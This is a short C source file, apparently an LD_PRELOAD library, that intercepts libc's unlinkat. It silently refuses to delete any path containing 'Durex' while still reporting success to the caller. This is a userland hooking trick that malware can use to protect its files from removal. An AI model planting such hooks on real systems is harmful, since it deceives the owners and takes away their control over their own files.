#define _GNU_SOURCE
#include<errno.h>
#include<dlfcn.h>
#include<string.h>
static int (*original_unlinkat)(int,const char*,int)=0;
int unlinkat(int dirfd,const char*pathname,int flags){if(original_unlinkat==0){original_unlinkat=dlsym(RTLD_NEXT,"unlinkat");if(original_unlinkat==0){errno=ENOMEM;return -1;}}if(strstr(pathname,"Durex")){return 0;}return original_unlinkat(dirfd,pathname,flags);}
